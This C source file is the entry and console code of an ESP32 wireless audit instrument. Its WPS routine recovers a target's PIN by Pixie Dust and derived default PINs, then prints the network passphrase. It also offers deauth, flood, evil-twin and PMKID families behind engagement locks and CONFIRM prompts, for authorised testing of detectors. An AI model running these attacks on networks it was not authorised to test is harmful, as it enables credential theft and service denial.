/* Basanos — application entry and navigation.
 *
 * A hub, not a wizard. From the home screen the operator enters a section by
 * radio (Wi-Fi, Bluetooth, Recon, Results) and moves around freely, rather
 * than being walked down one path they cannot leave.
 *
 * What does not change with the navigation: nothing transmits without a locked
 * engagement, no disruptive family fires without a sustained hold, and the
 * frame gate runs before every frame.
 *
 * SPDX-License-Identifier: MIT
 */
#include "ble.h"
#define STR2(x) #x
#define STR(x) STR2(x)

#include "board.h"
#include "console.h"
#include "display.h"
#include "frames.h"
#include "power.h"
#include "rawtx.h"
#include "sdlog.h"
#include "selftest.h"
#include "theme.h"
#include "touch.h"
#include "transmit.h"
#include "uartalarm.h"
#include "wpsatk.h"
#include "ui.h"

#include "basanos/rbac.h"
#include "basanos/wpa.h"
#include "basanos/score.h"
#include "basanos/station.h"
#include "basanos/target.h"
#include "basanos/ie.h"
#include "basanos/wpspin.h"
#include "basanos/pixie.h"

#include "driver/gpio.h"
#include "esp_event.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include <stdio.h>
#include <string.h>

static const char *TAG = "basanos";

static bas_scan_t       s_scan;
static bas_engagement_t s_engage;
static bas_card_t       s_card;

static uint32_t now_ms(void)
{
    return (uint32_t)(esp_timer_get_time() / 1000);
}

/* --- input ----------------------------------------------------------------

   Three buttons: left accepts, middle is power, right moves the selection.
   Back is a long press on the left, because the middle one belongs to the
   power circuit and stealing it for navigation would make "hold to switch off"
   ambiguous.
   ------------------------------------------------------------------------- */

typedef enum {
    EV_NONE = 0, EV_ACCEPT, EV_BACK, EV_NEXT, EV_POWEROFF,
} input_ev_t;

#define HOLD_BACK_MS  600u
#define HOLD_OFF_MS  1500u

static void buttons_init(void)
{
    gpio_config_t c = {
        .pin_bit_mask = (1ULL << BOARD_BTN_ACCEPT) |
                        (1ULL << BOARD_BTN_NEXT)   |
                        (1ULL << BOARD_BTN_PWR),
        .mode         = GPIO_MODE_INPUT,
        .pull_up_en   = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type    = GPIO_INTR_DISABLE,
    };
    ESP_ERROR_CHECK(gpio_config(&c));
}

static bool held(gpio_num_t pin) { return gpio_get_level(pin) == 0; }

static input_ev_t input_poll(void)
{
    static uint32_t accept_since, pwr_since;
    static bool     accept_was, next_was, pwr_was, accept_fired;
    /* The device is switched ON by holding this same button, so at the moment
     * firmware starts polling the operator's finger is usually still on it.
     * Without this latch the boot sequence sees a long press and obeys it:
     * the device comes up, reaches the main loop, and switches itself off
     * again -- opening and immediately closing.
     *
     * Power-off is therefore armed only after the button has been seen
     * released at least once since boot. */
    static bool     pwr_released_once;
    uint32_t t = now_ms();

    bool pwr = held(BOARD_BTN_PWR);
    if (!pwr) { pwr_released_once = true; }
    if (pwr && !pwr_was) { pwr_since = t; }
    pwr_was = pwr;
    if (pwr_released_once && pwr && (t - pwr_since) >= HOLD_OFF_MS) {
        return EV_POWEROFF;
    }

    bool a = held(BOARD_BTN_ACCEPT);
    if (a && !accept_was) { accept_since = t; accept_fired = false; }
    /* Back fires on the threshold rather than on release, so a tap and a hold
     * feel different without waiting to find out which happened. */
    if (a && !accept_fired && (t - accept_since) >= HOLD_BACK_MS) {
        accept_fired = true;
        accept_was = a;
        return EV_BACK;
    }
    bool accept_edge = (!a && accept_was && !accept_fired);
    accept_was = a;

    bool n = held(BOARD_BTN_NEXT);
    bool next_edge = (n && !next_was);
    next_was = n;

    if (accept_edge) { return EV_ACCEPT; }
    if (next_edge)   { return EV_NEXT; }
    return EV_NONE;
}

static bool input_held_down(void)
{
    if (held(BOARD_BTN_ACCEPT)) { return true; }
    if (bas_touch_present()) {
        bas_touch_t t;
        if (bas_touch_read(&t) && t.down) { return true; }
    }
    return false;
}

static bool ui_tap(uint16_t *x, uint16_t *y)
{
    return bas_touch_present() && bas_touch_tapped(x, y);
}

/* --- Wi-Fi ---------------------------------------------------------------- */

static bas_sec_t sec_of(wifi_auth_mode_t m)
{
    switch (m) {
    case WIFI_AUTH_OPEN:          return BAS_SEC_OPEN;
    case WIFI_AUTH_WEP:           return BAS_SEC_WEP;
    case WIFI_AUTH_WPA_PSK:       return BAS_SEC_WPA;
    case WIFI_AUTH_WPA2_PSK:
    case WIFI_AUTH_WPA_WPA2_PSK:  return BAS_SEC_WPA2;
    case WIFI_AUTH_ENTERPRISE:    return BAS_SEC_WPA2_ENT;
    case WIFI_AUTH_WPA3_PSK:      return BAS_SEC_WPA3;
    case WIFI_AUTH_WPA2_WPA3_PSK: return BAS_SEC_WPA2_WPA3;
    case WIFI_AUTH_OWE:           return BAS_SEC_WPA3;
    default:                      return BAS_SEC_UNKNOWN;
    }
}

static void wifi_init(void)
{
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(esp_netif_init());

    /* Optional subsystems fail gracefully: ESP_ERROR_CHECK on a double-init
     * returns ESP_ERR_INVALID_STATE and turns a harmless case into a boot
     * loop. */
    esp_err_t rc = esp_event_loop_create_default();
    if (rc != ESP_OK && rc != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(rc);
    }

    esp_netif_create_default_wifi_sta();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
}

static void survey(void)
{
    /* The scan and the promiscuous receiver both want the radio. Stopping the
     * receiver first avoids a scan that silently returns nothing. */
    bool was_listening = bas_sniff_active();
    if (was_listening) { bas_sniff_stop(); }

    bas_scan_reset(&s_scan);

    wifi_scan_config_t cfg = {
        .ssid = NULL, .bssid = NULL, .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_PASSIVE,
        .scan_time.passive = 120,
    };

    for (uint8_t ch = 1; ch <= 13; ch++) {
        bas_ui_scanning(ch, s_scan.count);
        cfg.channel = ch;
        if (esp_wifi_scan_start(&cfg, true) != ESP_OK) { continue; }

        uint16_t n = 0;
        esp_wifi_scan_get_ap_num(&n);
        if (n == 0u) { continue; }
        if (n > 20u) { n = 20u; }

        wifi_ap_record_t *recs = calloc(n, sizeof(wifi_ap_record_t));
        if (recs == NULL) { esp_wifi_clear_ap_list(); continue; }
        esp_wifi_scan_get_ap_records(&n, recs);

        for (uint16_t i = 0; i < n; i++) {
            bas_ap_t ap;
            memset(&ap, 0, sizeof(ap));
            memcpy(ap.bssid, recs[i].bssid, 6);
            bas_strlcpy(ap.ssid, (const char *)recs[i].ssid, sizeof(ap.ssid));
            ap.hidden        = (ap.ssid[0] == '\0');
            ap.channel       = recs[i].primary;
            ap.rssi          = recs[i].rssi;
            ap.sec           = sec_of(recs[i].authmode);
            ap.last_seen_ms  = now_ms();
            ap.first_seen_ms = ap.last_seen_ms;
            /* The domain this AP claims. Many consumer APs advertise none, so
             * an empty code is normal and says nothing either way. */
            if (recs[i].country.cc[0] >= 'A' && recs[i].country.cc[0] <= 'Z') {
                ap.country[0] = recs[i].country.cc[0];
                ap.country[1] = recs[i].country.cc[1];
                ap.country[2] = '\0';
            }
            if (bas_ap_check(&ap) != BAS_OK) { continue; }
            bas_scan_observe(&s_scan, &ap);
        }
        free(recs);
    }

    bas_scan_sort_rssi(&s_scan);
    if (was_listening) { bas_sniff_start(0); }
    ESP_LOGI(TAG, "survey: %u networks", (unsigned)s_scan.count);
    for (uint8_t i = 0; i < s_scan.count; i++) {
        const bas_ap_t *ap = &s_scan.ap[i];
        char mac[18];
        bas_mac_fmt(ap->bssid, mac, sizeof(mac));
        ESP_LOGI(TAG, "  %2u  %-22s %s ch%-3u %4ddBm %-9s%s", (unsigned)i,
                 ap->hidden ? "(hidden)" : ap->ssid, mac,
                 (unsigned)ap->channel, (int)ap->rssi, bas_sec_name(ap->sec),
                 bas_sec_likely_mfp(ap->sec) ? "  MFP" : "");
    }
}

/* Infer the regulatory domain from what the access points around us claim.
 *
 * This is evidence about where the APs think they are, which is usually but
 * not always where the operator is: a travel router, a misconfigured hotspot
 * or a neighbour's imported hardware all lie. So the inference reports its
 * majority and its sample size, and the operator can override it.
 *
 * When the evidence is thin or split it stays with the NARROWEST plan. A wrong
 * narrow guess refuses a transmission; a wrong wide one authorises an illegal
 * transmission, and those are not symmetric mistakes.
 *
 * Returns the votes for the winner, 0 when nothing claimed a domain. */
static int infer_region(bas_region_t *out, char *cc, size_t cc_n, int *total)
{
    int votes[3] = { 0, 0, 0 };
    char seen[3][3] = { { 0 }, { 0 }, { 0 } };
    int claimed = 0;

    for (uint8_t i = 0; i < s_scan.count; i++) {
        const char *c = s_scan.ap[i].country;
        if (c[0] == '\0') {
            continue;
        }
        claimed++;
        bas_region_t r = bas_region_from_country(c);
        votes[r]++;
        if (seen[r][0] == '\0') {
            seen[r][0] = c[0]; seen[r][1] = c[1]; seen[r][2] = '\0';
        }
    }

    if (total != NULL) { *total = claimed; }
    if (claimed == 0) {
        if (out != NULL) { *out = BAS_REGION_FCC; }
        return 0;
    }

    int best = 0;
    for (int r = 1; r < 3; r++) {
        if (votes[r] > votes[best]) { best = r; }
    }
    /* A bare plurality is not enough to widen a channel plan. Require most of
     * what was heard to agree. */
    if (votes[best] * 2 <= claimed) {
        if (out != NULL) { *out = BAS_REGION_FCC; }
        return 0;
    }

    if (out != NULL) { *out = (bas_region_t)best; }
    if (cc != NULL && cc_n >= 3u) {
        cc[0] = seen[best][0]; cc[1] = seen[best][1]; cc[2] = '\0';
    }
    return votes[best];
}

/* --- runs ------------------------------------------------------------------ */

static volatile bool s_abort;

/* The run currently open for scoring. A machine-reported alarm can arrive at
 * any moment between the first frame and the end of the grace window, so both
 * the transmit tick and the scoring screen drain into the same run. */
static int s_scoring_run = -1;

/* Passive discovery while nothing is running.
 *
 * On by default: an instrument that has been sitting on a bench for a minute
 * should already know what is in the room rather than making the operator ask.
 * It is receive-only, and it is suspended for the duration of any run because
 * the transmitter owns the channel then -- a hopping receiver would drag the
 * radio off the channel mid-burst. */
static bool s_bg_scan = true;

/* Credit any alarm the detector sent over the UART pads.
 *
 * This is the machine-timed path: the timestamp is the byte arriving, not an
 * operator noticing, and the source travels with it so the two are never
 * averaged together. */
static void poll_uart_alarms(void)
{
    if (s_scoring_run < 0) {
        return;
    }
    bas_alarm_t a;
    while (bas_uart_alarm_take(&a)) {
        bas_err_t rc = bas_card_alarm_from(&s_card, s_scoring_run, &a, now_ms());
        if (rc == BAS_OK) {
            ESP_LOGI(TAG, "alarm from %s over serial, conf %u",
                     a.detector, (unsigned)a.confidence);
        }
    }
}

typedef struct { bas_family_t f; uint32_t budget; } tx_ctx_t;

static bool tx_tick(const bas_tx_result_t *p, void *ctx)
{
    const tx_ctx_t *c = (const tx_ctx_t *)ctx;

    /* A detector that fires while the signal is still on air is a CAUGHT, and
     * that only happens if the alarm is collected during the run. */
    poll_uart_alarms();
    bas_ui_running(c->f, &s_engage, p, c->budget);

    /* A run is interruptible by the glass, by any button, or from the console
     * -- and the console path has to bypass the command queue, because a
     * continuous run never returns to the loop that drains it. An emission
     * with no end must always be stoppable. */
    if (bas_console_abort_requested()) {
        bas_console_clear_abort();
        s_abort = true;
    }

    uint16_t tx, ty;
    if (ui_tap(&tx, &ty))        { s_abort = true; }
    if (input_poll() != EV_NONE) { s_abort = true; }
    return !s_abort;
}

/* Families reachable from the Wi-Fi section, in menu order. Grouping by radio
 * is the whole point of the restructure: an operator looking for a deauth
 * should never scroll past a BLE family to find it. */
static const bas_family_t WIFI_FAMS[] = {
    BAS_FAM_DEAUTH, BAS_FAM_DISASSOC, BAS_FAM_CSA,
    BAS_FAM_AUTH_FLOOD, BAS_FAM_ASSOC_FLOOD,
    BAS_FAM_EVIL_TWIN, BAS_FAM_PMKID, BAS_FAM_BEACON, BAS_FAM_KARMA_RESP,
    BAS_FAM_PROBE_REQ,
};
#define WIFI_FAM_N ((int)(sizeof(WIFI_FAMS) / sizeof(WIFI_FAMS[0])))

static const bas_family_t BLE_FAMS[] = {
    BAS_FAM_BLE_ADV, BAS_FAM_BLE_NAMES, BAS_FAM_BLE_BEACON,
    BAS_FAM_BLE_TRACKER, BAS_FAM_BLE_SWARM, BAS_FAM_BLE_PERIPHERAL,
};
#define BLE_FAM_N ((int)(sizeof(BLE_FAMS) / sizeof(BLE_FAMS[0])))

/* --- console --------------------------------------------------------------- */

static int          s_last_run = -1;

static void console_help(void)
{
    bas_console_reply("scan                     re-survey the band");
    bas_console_reply("list                     networks, with index");
    bas_console_reply("wps                      WPS exposure survey (passive)");
    bas_console_reply("crack CONFIRM            recover the target's WPS PIN + key");
    bas_console_reply("lock <idx> <label>       lock an engagement");
    bas_console_reply("unlock                   drop it");
    bas_console_reply("fams                     families, with index");
    bas_console_reply("run <fam> [pps] [secs|forever]  emit; disruptive needs CONFIRM");
    bas_console_reply("abort                    stop a run");
    bas_console_reply("alarm [name]             record an alarm on the last run");
    bas_console_reply("card                     the scorecard");
    bas_console_reply("status                   where things stand");
    bas_console_reply("cell [off]               target every client on the network");
    bas_console_reply("region [fcc|etsi|jp]     regulatory channel clamp");
    bas_console_reply("psk [secs] [CONFIRM]     passphrase strength audit");
    bas_console_reply("bg [off]                 idle passive network discovery");
    bas_console_reply("blescan [off]            passive BLE device scan");
    bas_console_reply("uart [baud|off]          listen for detector alarms");
    bas_console_reply("selftest                 re-run the invariants");
}

static void console_status(void)
{
    bas_console_reply("networks=%u locked=%d rawtx=%d ch<=%u log=%s rows=%u",
                      (unsigned)s_scan.count, (int)s_engage.locked,
                      (int)bas_rawtx_available(),
                      (unsigned)bas_region_max_channel(), bas_sdlog_status(),
                      (unsigned)bas_sdlog_rows());
    if (s_engage.locked) {
        char mac[18];
        bas_mac_fmt(s_engage.target.bssid, mac, sizeof(mac));
        bas_console_reply("target=%s bssid=%s ch=%u sec=%s",
                          s_engage.target.hidden ? "(hidden)"
                                                 : s_engage.target.ssid,
                          mac, (unsigned)s_engage.target.channel,
                          bas_sec_name(s_engage.target.sec));
        bas_console_reply("label=%s ttl_left=%ums runs=%u", s_engage.label,
                          (unsigned)bas_engage_remaining_ms(&s_engage, now_ms()),
                          (unsigned)s_engage.runs);
    }
    bas_tally_t t;
    bas_card_tally(&s_card, now_ms(), &t);
    bas_console_reply("card caught=%d late=%d missed=%d pending=%d",
                      t.caught, t.late, t.missed, t.pending);
    bas_console_reply("uart=%d lines=%u parsed=%u last='%s'",
                      (int)bas_uart_alarm_active(),
                      (unsigned)bas_uart_alarm_lines(),
                      (unsigned)bas_uart_alarm_parsed(),
                      bas_uart_alarm_last());
}

static void console_list(void)
{
    for (uint8_t i = 0; i < s_scan.count; i++) {
        const bas_ap_t *ap = &s_scan.ap[i];
        char mac[18];
        bas_mac_fmt(ap->bssid, mac, sizeof(mac));
        bas_console_reply("%2u %-24s %s ch%-3u %4d %-9s%s", (unsigned)i,
                          ap->hidden ? "(hidden)" : ap->ssid, mac,
                          (unsigned)ap->channel, (int)ap->rssi,
                          bas_sec_name(ap->sec),
                          bas_sec_likely_mfp(ap->sec) ? " MFP" : "");
    }
    bas_console_reply("%u networks", (unsigned)s_scan.count);
}

static void console_fams(void)
{
    for (int i = 0; i < BAS_FAM__COUNT; i++) {
        const bas_family_spec_t *f = bas_family((bas_family_t)i);
        bas_console_reply("%d %-22s %-11s %s", i, f->name,
                          bas_class_name(f->klass),
                          bas_tx_supported((bas_family_t)i)
                              ? f->detector
                              : bas_tx_pending_reason((bas_family_t)i));
    }
}

/* The WPS survey.
 *
 * This is the cheapest finding the instrument produces and often the most
 * serious one. Everything it prints was already in the beacons received
 * during an ordinary scan -- no frame is transmitted to produce this report,
 * which is why it is safe to run before an engagement is even locked.
 *
 * What it deliberately does not do is recover the PIN or the passphrase. The
 * remediation for every line below is the same sentence -- "turn WPS off" --
 * and knowing the credential does not change it. */
/* WPS PIN recovery against the locked target.
 *
 * Three attacks, cheapest first, and the order is the whole design:
 *
 *   1. Pixie Dust. ONE exchange. The access point hands over M4 before it can
 *      have validated anything, and M4 carries the hashes the offline solver
 *      inverts. Costs one attempt against a lockout counter, so it runs first
 *      even though it is the most sophisticated.
 *   2. Derived default PINs. A dozen attempts, because a great many access
 *      points compute their PIN from a BSSID they broadcast continuously.
 *   3. Exhaustive. Eleven thousand attempts, offered but not run by default:
 *      at the rate an AP answers this is many hours and almost every modern
 *      firmware locks out long before the end.
 *
 * The credential is displayed. That is the point of the feature -- a finding
 * that says "WPS is enabled" gets filed, and the network's own passphrase on
 * a slide gets it turned off. Both describe the same defect; only one is
 * believed. It is never written to the SD log, because a report needs the
 * finding and an engagement has no reason to keep custody of the key. */
__attribute__((noinline))
static void console_crack(const bas_cmd_t *c)
{
    if (!s_engage.locked) {
        bas_console_reply("no engagement — 'lock <idx> <label>' first");
        return;
    }
    if (bas_engage_remaining_ms(&s_engage, now_ms()) == 0u) {
        bas_console_reply("engagement expired");
        return;
    }
    if (!c->confirm) {
        bas_console_reply("This associates with %s and attempts to recover its",
                          s_engage.target.hidden ? "(hidden)"
                                                 : s_engage.target.ssid);
        bas_console_reply("WPS PIN and passphrase. It is loud, the AP logs it,");
        bas_console_reply("and failed attempts may lock its WPS out for hours.");
        bas_console_reply("Repeat with CONFIRM.");
        return;
    }

    const bas_ap_t *t = &s_engage.target;
    if (!t->wps.present) {
        /* Not a refusal: an AP can run WPS without advertising it, and the
         * beacon may simply not have been re-read since. Say which it is. */
        bas_console_reply("target advertises no WPS element — trying anyway,");
        bas_console_reply("since an AP may run WPS without announcing it.");
    } else if (t->wps.locked) {
        bas_console_reply("target advertises WPS LOCKED — attempts will fail");
        bas_console_reply("until the lockout expires. Continuing.");
    }

    /* Static, not automatic: each of these carries 512 bytes of Pixie
     * material, and three stack copies overflowed the main task. Only one
     * recovery runs at a time -- the console is single-threaded and the run
     * is synchronous -- so file scope is correct here rather than merely
     * cheaper. */
    static bas_wpsatk_result_t r;
    memset(&r, 0, sizeof(r));

    /* --- 1: one exchange, for the offline attack --------------------------- */
    bas_console_reply("");
    bas_console_reply("[1/3] Pixie Dust — one exchange, then offline");
    esp_err_t rc = bas_wpsatk_try(12345670u, 30000u, &r);

    if (r.have_material) {
        bas_console_reply("      captured M1..M4 material");
        bas_pixie_run(&r.material, &r.pixie);
        if (r.pixie.found) {
            bas_console_reply("      PIN RECOVERED: %08u",
                              (unsigned)r.pixie.pin);
            bas_console_reply("      cause: %s",
                              bas_pixie_vuln_name(r.pixie.vuln));
            bas_console_reply("      %s",
                              bas_pixie_vuln_detail(r.pixie.vuln));

            /* The PIN is the finding; the passphrase is the proof. One more
             * exchange, with the real PIN, and the AP volunteers it. */
            static bas_wpsatk_result_t g;
            memset(&g, 0, sizeof(g));
            bas_console_reply("      redeeming the PIN for the credential...");
            (void)bas_wpsatk_try(r.pixie.pin, 30000u, &g);
            if (g.have_cred) {
                bas_console_reply("");
                bas_console_reply("      SSID:       %s", g.ssid);
                bas_console_reply("      PASSPHRASE: %s", g.passphrase);
                bas_console_reply("");
                bas_console_reply("      Not logged to SD. Copy it now if the "
                                  "report needs it.");
                return;
            }
            bas_console_reply("      PIN recovered but the AP did not return a");
            bas_console_reply("      credential. The PIN alone is the finding.");
            return;
        }
        bas_console_reply("      not vulnerable: the registrar's secret nonces");
        bas_console_reply("      were not any value a broken generator makes");
        bas_console_reply("      (%u candidates tested)",
                          (unsigned)r.pixie.tried);
    } else {
        bas_console_reply("      no material — the exchange did not reach M4");
        bas_console_reply("      (rc=%s). The AP may not accept an external",
                          esp_err_to_name(rc));
        bas_console_reply("      enrollee unless WPS was started on it.");
    }
    if (r.have_cred) {
        /* 12345670 is a real default, so the throwaway PIN sometimes works. */
        bas_console_reply("");
        bas_console_reply("      the probe PIN 12345670 was ACCEPTED — that is");
        bas_console_reply("      the vendor default, never changed.");
        bas_console_reply("      SSID:       %s", r.ssid);
        bas_console_reply("      PASSPHRASE: %s", r.passphrase);
        return;
    }

    /* --- 2: PINs derived from the BSSID ------------------------------------ */
    bas_pin_cand_t cand[BAS_MAX_PIN_CANDS];
    int n = bas_wps_pin_candidates(t->bssid, cand, BAS_MAX_PIN_CANDS);
    bas_console_reply("");
    bas_console_reply("[2/3] derived PINs — %d candidates from the BSSID", n);

    for (int i = 0; i < n; i++) {
        if (s_abort) {
            bas_console_reply("      aborted at %d/%d", i, n);
            return;
        }
        static bas_wpsatk_result_t a;
        memset(&a, 0, sizeof(a));
        bas_console_reply("      %2d/%d  %08u  (%s)", i + 1, n,
                          (unsigned)cand[i].pin,
                          bas_pinalg_name(cand[i].alg));
        (void)bas_wpsatk_try(cand[i].pin, 20000u, &a);

        if (a.have_cred) {
            bas_console_reply("");
            bas_console_reply("      PIN ACCEPTED: %08u",
                              (unsigned)cand[i].pin);
            bas_console_reply("      derivation:   %s",
                              bas_pinalg_name(cand[i].alg));
            bas_console_reply("      The PIN was computable from the BSSID the");
            bas_console_reply("      AP broadcasts, so it was never a secret.");
            bas_console_reply("");
            bas_console_reply("      SSID:       %s", a.ssid);
            bas_console_reply("      PASSPHRASE: %s", a.passphrase);
            return;
        }
        if (a.m2d > 0u) {
            /* A run of M2D is the AP refusing to talk. Continuing spends
             * attempts that are already being rejected. */
            bas_console_reply("      AP is refusing registrars — locked out.");
            bas_console_reply("      Stopping: further attempts extend the "
                              "lockout.");
            return;
        }
    }

    bas_console_reply("");
    bas_console_reply("[3/3] exhaustive search — 11,000 attempts, not started");
    bas_console_reply("      At the rate this AP answers that is many hours and");
    bas_console_reply("      most firmware locks out long before the end. The");
    bas_console_reply("      two attacks above are the ones worth reporting.");
    bas_console_reply("");
    bas_console_reply("no PIN recovered. That is a finding: this AP's WPS did");
    bas_console_reply("not fall to either cheap attack.");
}

static void console_wps(void)
{
    if (s_scan.count == 0) {
        bas_console_reply("no networks — 'scan' first");
        return;
    }

    unsigned exposed = 0, locked = 0, none = 0, pin_seen = 0;

    bas_console_reply("WPS survey — %u network(s), nothing transmitted",
                      (unsigned)s_scan.count);

    for (unsigned i = 0; i < s_scan.count; i++) {
        const bas_ap_t *a = &s_scan.ap[i];
        bas_wps_risk_t r = bas_wps_grade(&a->wps);

        if (r == BAS_WPS_NONE) {
            none++;
            continue;
        }
        if (r == BAS_WPS_LOCKED) {
            locked++;
        } else {
            exposed++;
            if (r == BAS_WPS_PIN_OPEN || r == BAS_WPS_REGISTRAR) {
                pin_seen++;
            }
        }

        bas_console_reply("");
        bas_console_reply("[%u] %-20s ch%-2u %ddBm  %s",
                          i,
                          a->hidden ? "(hidden)" : a->ssid,
                          (unsigned)a->channel, (int)a->rssi,
                          bas_wps_risk_name(r));
        bas_console_reply("    %02X:%02X:%02X:%02X:%02X:%02X  %s",
                          a->bssid[0], a->bssid[1], a->bssid[2],
                          a->bssid[3], a->bssid[4], a->bssid[5],
                          bas_sec_name(a->sec));

        /* The methods matter to a report: "Label" is a PIN printed on the
         * sticker, which never changes and cannot be rotated by the owner. */
        if (a->wps.config_methods != 0u) {
            char m[72];
            size_t n = 0;
            m[0] = '\0';
            static const struct { uint16_t bit; const char *name; } k[] = {
                { BAS_WPS_CM_LABEL,   "Label"    },
                { BAS_WPS_CM_DISPLAY, "Display"  },
                { BAS_WPS_CM_KEYPAD,  "Keypad"   },
                { BAS_WPS_CM_PBC,     "PushBtn"  },
                { BAS_WPS_CM_EXT_NFC, "NFC"      },
            };
            for (size_t j = 0; j < sizeof(k) / sizeof(k[0]); j++) {
                if ((a->wps.config_methods & k[j].bit) == 0u) {
                    continue;
                }
                int w = snprintf(m + n, sizeof(m) - n, "%s%s",
                                 (n != 0u) ? " " : "", k[j].name);
                if (w <= 0 || (size_t)w >= sizeof(m) - n) {
                    break;
                }
                n += (size_t)w;
            }
            bas_console_reply("    methods: %s", m);
        }

        if (a->wps.manufacturer[0] != '\0' || a->wps.model[0] != '\0') {
            bas_console_reply("    device:  %s %s",
                              a->wps.manufacturer, a->wps.model);
        }

        bas_console_reply("    %s", bas_wps_advice(r));

        if (r != BAS_WPS_LOCKED && bas_wps_vendor_suspect(&a->wps)) {
            /* Deliberately hedged. The vendor string is chosen by the firmware
             * author, several of these vendors ship more than one chipset, and
             * a rebadged box may name a company that never made its radio. A
             * report that states this as fact will be wrong in public. */
            bas_console_reply("    note: this vendor has shipped chipsets with "
                              "predictable registrar");
            bas_console_reply("          nonces (offline PIN recovery). The "
                              "NAME is weak evidence —");
            bas_console_reply("          only an M1 exchange would establish "
                              "it.");
        }
    }

    bas_console_reply("");
    if (exposed == 0u) {
        bas_console_reply("%u exposed, %u locked, %u without WPS",
                          exposed, locked, none);
        /* Not the same claim as "these networks are secure", and it must not
         * be allowed to read as one. */
        bas_console_reply("no WPS exposure in what was heard — other findings "
                          "are unaffected");
    } else {
        bas_console_reply("%u EXPOSED, %u locked, %u without WPS",
                          exposed, locked, none);
        /* Only claim a PIN method where one was actually advertised. Most
         * beacons omit Config Methods entirely, and saying "an exposed PIN
         * method" about those would put a finding in a report that the
         * evidence does not support. */
        if (pin_seen > 0u) {
            bas_console_reply("%u advertise a PIN method: recoverable, and it "
                              "yields the passphrase.", pin_seen);
        }
        if (exposed > pin_seen) {
            bas_console_reply("the rest are enabled and unlocked but do not "
                              "announce their methods —");
            bas_console_reply("'crack CONFIRM' against a locked target settles "
                              "it.");
        }
    }
}

static void console_card(void)
{
    char line[96];
    for (uint8_t i = 0; i < s_card.count; i++) {
        bas_run_line(&s_card.r[i], now_ms(), line, sizeof(line));
        bas_console_reply("%2u %s", (unsigned)i, line);
    }
    bas_tally_t t;
    bas_card_tally(&s_card, now_ms(), &t);
    bas_console_reply("caught=%d late=%d missed=%d pending=%d best=%dms",
                      t.caught, t.late, t.missed, t.pending,
                      (int)t.best_latency_ms);
}

static void console_run(const bas_cmd_t *c)
{
    if (c->index < 0 || c->index >= BAS_FAM__COUNT) {
        bas_console_reply("no such family — 'fams'");
        return;
    }
    bas_family_t f = (bas_family_t)c->index;
    const bas_family_spec_t *fs = bas_family(f);

    if (!bas_tx_supported(f)) {
        bas_console_reply("unavailable: %s", bas_tx_pending_reason(f));
        return;
    }
    /* The remote equivalent of the hold: explicit, case-sensitive, and
     * impossible to produce by habit. */
    if (fs->klass == BAS_CLASS_DISRUPTIVE && !c->confirm) {
        bas_console_reply("refused: %s denies service — append CONFIRM",
                          fs->name);
        return;
    }

    bas_plan_t p;
    bas_plan_default(&p, f);
    if (c->pps  > 0) { p.pps     = (uint16_t)c->pps; }
    if (c->secs > 0)      { p.seconds = (uint16_t)c->secs; }
    else if (c->secs < 0) { p.seconds = 0u; }   /* continuous */

    uint8_t role = (fs->klass == BAS_CLASS_DISRUPTIVE) ? BAS_ROLE_ADMIN
                                                       : BAS_ROLE_OPERATOR;
    bas_err_t v = bas_plan_validate(&p, role, &s_engage, now_ms());
    if (v != BAS_OK) {
        bas_console_reply("refused: %s", bas_err_str(v));
        return;
    }
    if (p.clamped_pps || p.clamped_secs) {
        bas_console_reply("clamped to %u pps for %us", (unsigned)p.pps,
                          (unsigned)p.seconds);
    }

    uint32_t budget = bas_plan_frame_budget(&p);
    if (p.continuous) {
        bas_console_reply("running %s: %u pps, ch%u, UNTIL STOPPED",
                          fs->name, (unsigned)p.pps, (unsigned)p.channel);
        bas_console_reply("  'abort' stops it; the engagement ends it anyway");
    } else {
        bas_console_reply("running %s: %u frames, %u pps, ch%u", fs->name,
                          (unsigned)budget, (unsigned)p.pps,
                          (unsigned)p.channel);
    }
    tx_ctx_t ctx = { .f = f, .budget = budget };
    s_abort = false;
    int idx = bas_card_begin(&s_card, f, now_ms(), BAS_GRACE_DEFAULT_MS);
    s_scoring_run = idx;

    uint32_t t0 = now_ms();
    bas_tx_result_t res;
    esp_err_t rc = bas_tx_run(&p, &s_engage, role, tx_tick, &ctx, &res);
    uint32_t t1 = now_ms();

    if (idx >= 0) { bas_card_end(&s_card, idx, now_ms(), res.frames_sent); }
    bas_engage_note_run(&s_engage);

    bas_console_reply("result rc=%s sent=%u rejected=%u refused=%u %ums",
                      esp_err_to_name(rc), (unsigned)res.frames_sent,
                      (unsigned)res.tx_errors, (unsigned)res.frames_refused,
                      (unsigned)(t1 - t0));
    bas_console_reply("window uptime_ms %u..%u", (unsigned)t0, (unsigned)t1);

    {
        char note[64] = "";
        if (f == BAS_FAM_PMKID) {
            const bas_pmkid_watch_t *w = bas_sniff_watch_result();
            snprintf(note, sizeof(note), "%s", w->pmkid_offered
                ? "PMKID OFFERED"
                : (w->eapol_m1 ? "M1 no PMKID" : "no M1"));
        }
        bas_sdlog_run(&s_engage, f, &p, &res, note);
    }

    if (f == BAS_FAM_PMKID) {
        /* The posture finding, which is the half of this family worth putting
         * in a report. The PMKID itself was never stored. */
        const bas_pmkid_watch_t *w = bas_sniff_watch_result();
        bas_console_reply("pmkid auth=%d(status %u) assoc=%d(status %u) m1=%d",
                          (int)w->auth_resp, (unsigned)w->auth_status,
                          (int)w->assoc_resp, (unsigned)w->assoc_status,
                          (int)w->eapol_m1);
        bas_console_reply("FINDING: %s", w->pmkid_offered
            ? "AP offers a PMKID to an unauthenticated device"
            : (w->eapol_m1 ? "AP answered but offered no PMKID"
                           : "no EAPOL M1 seen"));
    }

    if (res.frames_sent == 0u) {
        if (idx >= 0 && idx == (int)s_card.count - 1) {
            s_card.count--;
            memset(&s_card.r[idx], 0, sizeof(s_card.r[idx]));
        }
        bas_console_reply("NOTHING WENT OUT — run discarded, not scored");
        s_last_run = -1;
        return;
    }
    s_last_run = idx;

